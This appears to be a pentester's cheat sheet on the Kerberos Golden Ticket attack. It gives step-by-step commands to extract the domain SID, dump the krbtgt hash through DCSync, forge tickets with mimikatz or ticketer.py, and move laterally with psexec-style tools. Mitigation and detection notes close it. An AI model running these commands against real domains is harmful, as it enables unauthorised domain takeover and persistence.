### Content

- [Overview](#overview)
	- [Extracting Domain SID](#extracting-domain-sid)
	- [Extracting KRBTGT Hash](#extracting-krbtgt-hash)
- [From Windows](#from-windows)
- [From Linux](#from-linux)
- [Mitigation](#mitigation)

---
### Overview

The `Golden Ticket` attack enables attacker to forge and sign TGTs using the `krbtgt` account's password hash. When these TGTs get presented to an AD server, the information within them will not be checked at all and will be considered valid due to being signed with `krbtgt` account's password hash.

When a user send a `AS_REQ` with correct credentials to the DC, the DC will send back a TGT contains a PAC (Privilege Attribute Certificate) which is a piece of data that contains information about the user.

The PAC is copied into each TGS ticket so that service accounts know who they are dealing with. Therefore, if an attacker arbitrarily modify its information (for example, by making it look like a user belongs to the Domain Admins group) and encrypt it again using the secret of `krbtgt`. This forged ticket is called a `Golden Ticket` and will not be checked.

Even if the impersonated user is not represent in the AD forest, If the attacker added the Domain Administrators in the TGT's PAC section, this fiction impersonated user will be treated as an admin.

Elements needed to forge a golden ticket:

- Domain Name
- Domain SID
- Username to Impersonate
- KRBTGT's hash

###### Extracting Domain SID

From Windows

```PowerShell
# Activedriectory module
(Get-ADDomain).DomainSID.Value

# Using PowerView
Get-DomainSID
```

From Linux

```
# Using ldap module from NXC
nxc ldap <DC-IP> -u <user> -p <pass> --get-sid

lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids
```

###### Extracting KRBTGT Hash

Performing DCSync from Linux

```bash
secretsdump -dc-ip <IP> <domain>/<user>:<password>@<DC_host> -outputfile 'dcsync'

# with Pass-the-Ticket
KRB5CCNAME=ticket.ccache secretsdump -k -no-pass -outputfile 'dcsync' -dc-ip <dc_ip> @<DC_HOST>
```

Performing DCSync from Windows

```bash
# Getting the krbtgt hash using DCSync using mimikatz
lsadump::dcsync /user:krbtgt /domain:corp.local
```

---
### From Windows

```PowerShell
# Forging the ticket
kerberos::golden /domain:corp.local /user:Administrator /sid:<domainSID> /rc4:<krbtgtHash> /ptt

# To be used after injecting ticket with either Rubeus or Mimikatz
PS> Enter-PSSession -ComputerName DC01
# Or
PS> .\PsExec.exe -accepteula \\<IP> cmd
```

---
### From Linux

```bash
ticketer.py -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain corp.local Administrator

export KRB5CCNAME=./Administrator.ccache

psexec.py corp.local/user@DC01.security.local -k -no-pass
smbexec.py corp.local/user@DC01.security.local -k -no-pass
wmiexec.py corp.local/user@DC01.security.local -k -no-pass
```

---
### Mitigation

- Implement a least privilege access model.
- Limit the number of admin accounts and make them separate non-interactive accounts
- Do not expose services such as RDP to the world
- Utilize Multi-factor authentication on implementations such as OWA and VPNs
- Endpoint Detection and antivirus can go a long way to helping prevent and detect tools like Mimikatz and the misuse of TGTs

Some notes:

- Resetting the impersonated account’s password does not invalidate the ticket.
- Golden tickets are usually created with much longer lifespan than tickets have by default.
	- Mimikatz makes golden tickets with a default lifespan of 10 years. which can be detected as an IoC.
- It also can be detected if:
	- The account DOMAIN field is blank.
	- The account DOMAIN field contains DOMAIN FQDN instead of just domain.

> If golden ticket attack is detected, the `krbtgt` account password must be changed twice to remove the persistence